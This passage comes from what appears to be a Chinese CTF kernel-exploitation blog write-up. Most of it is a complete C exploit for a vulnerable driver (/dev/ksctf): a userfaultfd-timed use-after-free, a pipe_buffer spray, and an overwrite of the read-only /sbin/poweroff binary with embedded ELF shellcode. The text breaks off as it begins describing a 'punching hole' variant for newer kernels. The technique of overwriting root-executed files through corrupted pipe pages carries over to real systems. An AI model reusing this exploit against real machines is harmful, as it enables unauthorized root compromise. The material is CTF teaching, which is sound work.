class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/sem.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;semaphore.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/msg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/shm.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/keyctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/user.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ptrace.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stddef.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/utsname.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdbool.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/resource.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/userfaultfd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;asm/ldt.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/if_packet.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">node</span>&#123;</span></span><br><span class="line">    <span class="type">char</span> *msg;</span><br><span class="line">    <span class="type">uint64_t</span> a;</span><br><span class="line">    <span class="type">uint64_t</span> b;</span><br><span class="line">    <span class="type">uint64_t</span> c;</span><br><span class="line">    <span class="type">uint64_t</span> d;</span><br><span class="line">    <span class="type">uint64_t</span> e;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">node</span> <span class="title">vuln</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_PIPE_COUNT 0x20</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_SECONDARY_PIPE_COUNT 0x150</span></span><br><span class="line"><span class="type">int</span> pipe_fd[MAX_PIPE_COUNT][<span class="number">2</span>];</span><br><span class="line"><span class="type">int</span> already_read[MAX_PIPE_COUNT];</span><br><span class="line"><span class="type">int</span> snd_pipe_fd[MAX_SECONDARY_PIPE_COUNT][<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">spray_pipes</span><span class="params">(<span class="type">int</span> start, <span class="type">int</span> cnt)</span> &#123;</span><br><span class="line">    <span class="type">char</span> *buf[<span class="number">0x1000</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] enter %s start from index: %d\n&quot;</span>, __PRETTY_FUNCTION__, start);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = start; i &lt; cnt; ++i) &#123;</span><br><span class="line">        <span class="keyword">if</span> (pipe(pipe_fd[i]) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            perror(<span class="string">&quot;create pipe&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">spray_pipes2</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span> *buf[<span class="number">0x1000</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] enter %s\n&quot;</span>, __PRETTY_FUNCTION__);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; MAX_SECONDARY_PIPE_COUNT; ++i) &#123;</span><br><span class="line">        <span class="keyword">if</span> (pipe(snd_pipe_fd[i]) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            perror(<span class="string">&quot;create pipe&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (fcntl(snd_pipe_fd[i][<span class="number">1</span>], F_SETPIPE_SZ, <span class="number">0x1000</span> * <span class="number">1</span>) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            perror(<span class="string">&quot;resize pipe&quot;</span>);    </span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;   </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">err_exit</span><span class="params">(<span class="type">char</span> *msg)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[31m\033[1m[x] Error at: \033[0m%s\n&quot;</span>, msg);</span><br><span class="line">    sleep(<span class="number">5</span>);</span><br><span class="line">    <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">info</span><span class="params">(<span class="type">char</span> *msg)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[+] %s\n\033[0m&quot;</span>, msg);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">hexx</span><span class="params">(<span class="type">char</span> *msg, <span class="type">size_t</span> value)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] %s: %#lx\n\033[0m&quot;</span>, msg, value);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">binary_dump</span><span class="params">(<span class="type">char</span> *desc, <span class="type">void</span> *addr, <span class="type">int</span> len)</span> &#123;</span><br><span class="line">    <span class="type">uint64_t</span> *buf64 = (<span class="type">uint64_t</span> *) addr;</span><br><span class="line">    <span class="type">uint8_t</span> *buf8 = (<span class="type">uint8_t</span> *) addr;</span><br><span class="line">    <span class="keyword">if</span> (desc != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[33m[*] %s:\n\033[0m&quot;</span>, desc);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; len / <span class="number">8</span>; i += <span class="number">4</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;  %04x&quot;</span>, i * <span class="number">8</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span>; j++) &#123;</span><br><span class="line">            i + j &lt; len / <span class="number">8</span> ? <span class="built_in">printf</span>(<span class="string">&quot; 0x%016lx&quot;</span>, buf64[i + j]) : <span class="built_in">printf</span>(<span class="string">&quot;                   &quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;   &quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">32</span> &amp;&amp; j + i * <span class="number">8</span> &lt; len; j++) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, <span class="built_in">isprint</span>(buf8[i * <span class="number">8</span> + j]) ? buf8[i * <span class="number">8</span> + j] : <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* bind the process to specific core */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">bind_core</span><span class="params">(<span class="type">int</span> core)</span>&#123;</span><br><span class="line">    <span class="type">cpu_set_t</span> cpu_set;</span><br><span class="line"></span><br><span class="line">    CPU_ZERO(&amp;cpu_set);</span><br><span class="line">    CPU_SET(core, &amp;cpu_set);</span><br><span class="line">    sched_setaffinity(getpid(), <span class="keyword">sizeof</span>(cpu_set), &amp;cpu_set);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[*] Process binded to core \033[0m%d\n&quot;</span>, core);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> user_cs, user_ss, user_rflags, user_sp;</span><br><span class="line"><span class="type">void</span> <span class="title function_">save_status</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="keyword">asm</span> <span class="title function_">volatile</span> <span class="params">(</span></span><br><span class="line"><span class="params">        <span class="string">&quot;mov user_cs, cs;&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;mov user_ss, ss;&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;mov user_sp, rsp;&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;pushf;&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;pop user_rflags;&quot;</span></span></span><br><span class="line"><span class="params">    )</span>;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[34m\033[1m[*] Status has been saved.\033[0m&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> fd;</span><br><span class="line"><span class="type">char</span> v14[<span class="number">0x100</span>];</span><br><span class="line"><span class="type">void</span> <span class="title function_">add</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Begin add.&quot;</span>);</span><br><span class="line">    vuln.e = (<span class="type">size_t</span>)v14;</span><br><span class="line">    <span class="keyword">for</span>(;;)&#123;</span><br><span class="line">        <span class="type">int</span> result = ioctl(fd, <span class="number">0xFFF0</span>, &amp;vuln);</span><br><span class="line">        <span class="keyword">if</span>(result != <span class="number">-1</span>)&#123;</span><br><span class="line">            info(<span class="string">&quot;Add success.&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">del</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Begin delete&quot;</span>);</span><br><span class="line">    vuln.e = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(;;)&#123;</span><br><span class="line">        <span class="type">int</span> result = ioctl(fd, <span class="number">0xFFF1</span>, &amp;vuln);</span><br><span class="line">        <span class="keyword">if</span>(result != <span class="number">-1</span>)&#123;</span><br><span class="line">            info(<span class="string">&quot;Delete success.&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> uffd_buf[<span class="number">0x200</span>];</span><br><span class="line"><span class="type">void</span> <span class="title function_">register_userfaultfd</span><span class="params">(<span class="type">void</span>* uffd_buf, <span class="type">pthread_t</span> pthread_moniter, <span class="type">void</span>* handler)</span>&#123;</span><br><span class="line">    <span class="type">int</span> uffd;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_api</span> <span class="title">uffdio_api</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_register</span> <span class="title">uffdio_register</span>;</span></span><br><span class="line"> </span><br><span class="line">    uffd = syscall(__NR_userfaultfd, O_NONBLOCK|O_CLOEXEC);</span><br><span class="line">    <span class="keyword">if</span> (uffd == <span class="number">-1</span>) err_exit(<span class="string">&quot;syscall for userfaultfd ERROR in register_userfaultfd func&quot;</span>);</span><br><span class="line"> </span><br><span class="line">    uffdio_api.api = UFFD_API;</span><br><span class="line">    uffdio_api.features = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (ioctl(uffd, UFFDIO_API, &amp;uffdio_api) == <span class="number">-1</span>) err_exit(<span class="string">&quot;ioctl for UFFDIO_API ERROR&quot;</span>);</span><br><span class="line"> </span><br><span class="line">    uffdio_register.range.start = (<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>)uffd_buf;</span><br><span class="line">    uffdio_register.range.len = <span class="number">0x1000</span>;</span><br><span class="line">    uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;</span><br><span class="line">    <span class="keyword">if</span> (ioctl(uffd, UFFDIO_REGISTER, &amp;uffdio_register) == <span class="number">-1</span>) err_exit(<span class="string">&quot;ioctl for UFFDIO_REGISTER ERROR&quot;</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="type">int</span> res = pthread_create(&amp;pthread_moniter, <span class="literal">NULL</span>, handler, uffd);</span><br><span class="line">    <span class="keyword">if</span> (res == <span class="number">-1</span>) err_exit(<span class="string">&quot;pthread_create ERROR in register_userfaultfd func&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">hijack_handler</span><span class="params">(<span class="type">void</span> *args)</span>&#123;</span><br><span class="line">    <span class="type">int</span> uffd = (<span class="type">int</span>)args;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffd_msg</span> <span class="title">msg</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_copy</span> <span class="title">uffdio_copy</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (;;)&#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">pollfd</span> <span class="title">pollfd</span>;</span></span><br><span class="line">        pollfd.fd = uffd;</span><br><span class="line">        pollfd.events = POLLIN;</span><br><span class="line">        <span class="keyword">if</span> (poll(&amp;pollfd, <span class="number">1</span>, <span class="number">-1</span>) == <span class="number">-1</span>)</span><br><span class="line">            err_exit(<span class="string">&quot;Failed to exec poll for leak_handler&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> res = read(uffd, &amp;msg, <span class="keyword">sizeof</span>(msg));</span><br><span class="line">        <span class="keyword">if</span> (res == <span class="number">0</span>)</span><br><span class="line">            err_exit(<span class="string">&quot;EOF on userfaultfd for leak_handler&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (res == <span class="number">-1</span>)</span><br><span class="line">            err_exit(<span class="string">&quot;ERROR on userfaultfd for leak_handler&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (msg.event != UFFD_EVENT_PAGEFAULT)</span><br><span class="line">            err_exit(<span class="string">&quot;INCORRET EVENT in leak_handler&quot;</span>);</span><br><span class="line">        <span class="comment">// operation</span></span><br><span class="line">        info(<span class="string">&quot;hijack the kernel in userfaultfd -- hijack_handler&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[*] trigger uaf\n&quot;</span>);</span><br><span class="line">        del();</span><br><span class="line">        </span><br><span class="line">        sleep(<span class="number">3</span>);</span><br><span class="line">        spray_pipes(<span class="number">0</span>, MAX_PIPE_COUNT);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; MAX_PIPE_COUNT; ++i) &#123;</span><br><span class="line">            <span class="type">uint32_t</span> k = i;</span><br><span class="line">            write(pipe_fd[i][<span class="number">1</span>], <span class="string">&quot;writesth&quot;</span>, <span class="number">8</span>);</span><br><span class="line">            write(pipe_fd[i][<span class="number">1</span>], &amp;k, <span class="keyword">sizeof</span>(<span class="type">uint32_t</span>));</span><br><span class="line">            write(pipe_fd[i][<span class="number">1</span>], &amp;k, <span class="keyword">sizeof</span>(<span class="type">uint32_t</span>));</span><br><span class="line">            write(pipe_fd[i][<span class="number">1</span>], &amp;k, <span class="keyword">sizeof</span>(<span class="type">uint32_t</span>));</span><br><span class="line">            write(pipe_fd[i][<span class="number">1</span>], <span class="string">&quot;Qanux&quot;</span>, <span class="number">8</span>);</span><br><span class="line">            write(pipe_fd[i][<span class="number">1</span>], <span class="string">&quot;Qanux&quot;</span>, <span class="number">8</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">char</span> tmp[<span class="number">0x10</span>];</span><br><span class="line"></span><br><span class="line">        uffd_buf[<span class="number">0</span>] = <span class="number">0xe180</span>;</span><br><span class="line"></span><br><span class="line">        uffdio_copy.src = uffd_buf;</span><br><span class="line">        uffdio_copy.dst = (<span class="type">unsigned</span> <span class="type">long</span>)msg.arg.pagefault.address &amp; ~(<span class="number">0x1000</span> - <span class="number">1</span>);</span><br><span class="line">        uffdio_copy.len = <span class="number">0x1000</span>;</span><br><span class="line">        uffdio_copy.mode = <span class="number">0</span>;</span><br><span class="line">        uffdio_copy.copy = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> (ioctl(uffd, UFFDIO_COPY, &amp;uffdio_copy) == <span class="number">-1</span>)</span><br><span class="line">            err_exit(<span class="string">&quot;Failed to exec ioctl for UFFDIO_COPY in leak_handler&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> shellcode[] = &#123;</span><br><span class="line">    <span class="number">0x7f</span>, <span class="number">0x45</span>, <span class="number">0x4c</span>, <span class="number">0x46</span>, <span class="number">0x02</span>, <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x3e</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x78</span>, <span class="number">0x00</span>, <span class="number">0x40</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x40</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x40</span>, <span class="number">0x00</span>, <span class="number">0x38</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x05</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x40</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x40</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x97</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x97</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x10</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x48</span>, <span class="number">0xbf</span>, <span class="number">0x2f</span>, <span class="number">0x66</span>, <span class="number">0x6c</span>, <span class="number">0x61</span>, <span class="number">0x67</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x57</span>, <span class="number">0x48</span>,</span><br><span class="line">    <span class="number">0x89</span>, <span class="number">0xe7</span>, <span class="number">0x48</span>, <span class="number">0x31</span>, <span class="number">0xf6</span>, <span class="number">0x48</span>, <span class="number">0x31</span>, <span class="number">0xd2</span>, <span class="number">0x48</span>, <span class="number">0x83</span>, <span class="number">0xc0</span>, <span class="number">0x02</span>,</span><br><span class="line">    <span class="number">0x0f</span>, <span class="number">0x05</span>, <span class="number">0x89</span>, <span class="number">0xc7</span>, <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0xe6</span>, <span class="number">0x48</span>, <span class="number">0xc7</span>, <span class="number">0xc2</span>, <span class="number">0x00</span>, <span class="number">0x01</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x31</span>, <span class="number">0xc0</span>, <span class="number">0x0f</span>, <span class="number">0x05</span>, <span class="number">0xb8</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0xbf</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x0f</span>, <span class="number">0x05</span>, <span class="number">0x00</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>** argv, <span class="type">char</span>** env)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> data[<span class="number">0x200</span>];</span><br><span class="line"></span><br><span class="line">    bind_core(<span class="number">0</span>);</span><br><span class="line">    save_status();</span><br><span class="line"></span><br><span class="line">    fd = open(<span class="string">&quot;/dev/ksctf&quot;</span>,O_RDWR);</span><br><span class="line">    <span class="keyword">if</span> (fd &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        err_exit(<span class="string">&quot;open device failed!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    vuln.msg = (<span class="type">char</span>*)<span class="built_in">malloc</span>(<span class="number">0x30</span>);</span><br><span class="line">    <span class="built_in">memset</span>(vuln.msg, <span class="string">&#x27;\x00&#x27;</span>, <span class="number">0x30</span>);</span><br><span class="line"></span><br><span class="line">    add();</span><br><span class="line"></span><br><span class="line">    <span class="type">pthread_t</span> pwn;</span><br><span class="line">    <span class="type">char</span> *uffd_buf_hijack = mmap(<span class="literal">NULL</span>, <span class="number">0x1000</span>, PROT_READ|PROT_WRITE, MAP_ANONYMOUS|MAP_PRIVATE, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    register_userfaultfd(uffd_buf_hijack, &amp;pwn, hijack_handler);</span><br><span class="line"></span><br><span class="line">    write(fd,uffd_buf_hijack,<span class="number">0x2</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// try to find corrupted pipe_buf</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] finding corrupted page\n&quot;</span>);</span><br><span class="line">    <span class="type">int</span> corrupted_index = <span class="number">-1</span>, pointed_index = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; MAX_PIPE_COUNT; ++i) &#123;</span><br><span class="line">        already_read[i] = <span class="number">1</span>;</span><br><span class="line">        <span class="type">uint32_t</span> k = <span class="number">0</span>;</span><br><span class="line">        <span class="type">char</span> p_buf[<span class="number">0x10</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">        <span class="built_in">memset</span>(p_buf, <span class="number">0</span>, <span class="number">0x10</span>);</span><br><span class="line"></span><br><span class="line">        read(pipe_fd[i][<span class="number">0</span>], p_buf, <span class="number">8</span>);</span><br><span class="line">        read(pipe_fd[i][<span class="number">0</span>], &amp;k, <span class="keyword">sizeof</span>(<span class="type">uint32_t</span>));</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (k != i) &#123;</span><br><span class="line">            corrupted_index = i;</span><br><span class="line">            pointed_index = k;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[+] found %d=&gt;%d pipe data: %p\n&quot;</span>, i, k, *(<span class="type">uint64_t</span> *)p_buf);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        usleep(<span class="number">1000</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (corrupted_index == <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-] failed to find corrupted page\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> *alloc_buf = (<span class="type">char</span>*)<span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line">    <span class="built_in">memset</span>(alloc_buf, <span class="number">0</span>, <span class="number">0x1000</span>);</span><br><span class="line">    write(pipe_fd[pointed_index][<span class="number">1</span>], alloc_buf, <span class="number">0x20</span>);</span><br><span class="line">    close(pipe_fd[corrupted_index][<span class="number">0</span>]);</span><br><span class="line">    close(pipe_fd[corrupted_index][<span class="number">1</span>]);</span><br><span class="line">    <span class="type">int</span> passwd_fd[<span class="number">0x200</span>];</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x200</span>; i++)&#123;</span><br><span class="line">        passwd_fd[i] = open(<span class="string">&quot;/sbin/poweroff&quot;</span>, O_RDONLY);</span><br><span class="line">        <span class="keyword">if</span>(passwd_fd[i] &lt; <span class="number">0</span>)&#123;</span><br><span class="line">            err_exit(<span class="string">&quot;open file.&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="type">size_t</span> tmp = <span class="number">0x480e801f</span>;</span><br><span class="line">    write(pipe_fd[pointed_index][<span class="number">1</span>], &amp;tmp, <span class="number">4</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x200</span>; i++)&#123;</span><br><span class="line">        <span class="type">int</span> retval = write(passwd_fd[i], shellcode, <span class="keyword">sizeof</span>(shellcode));</span><br><span class="line">        <span class="keyword">if</span>(retval &gt; <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;write file success.&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x200</span>; i++)&#123;</span><br><span class="line">        close(passwd_fd[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] EXP END.&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="求解效果-2"><a href="#求解效果-2" class="headerlink" title="求解效果"></a>求解效果</h3><img src="/2024/10/07/kno_puts/12.png" class="" title="我的图图呢">  <h2 id="punching-hole-pipe-buffer-page-UAF"><a href="#punching-hole-pipe-buffer-page-UAF" class="headerlink" title="punching hole + pipe_buffer  + page UAF"></a>punching hole + pipe_buffer  + page UAF</h2><h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h3><p>这里我们对题目再进行最后一次升级，我们假设 <code>kernel</code> 版本为 <code>6.6+</code>，这个时候 <code>userfaultfd</code> 就只运行特权用户使用了。也许我们会想到用 <code>fuse</code>，可是在 <code>kernel pwn</code> 这种环境残缺的情况很难使用，这个时候我们就可以使用 <code>punching 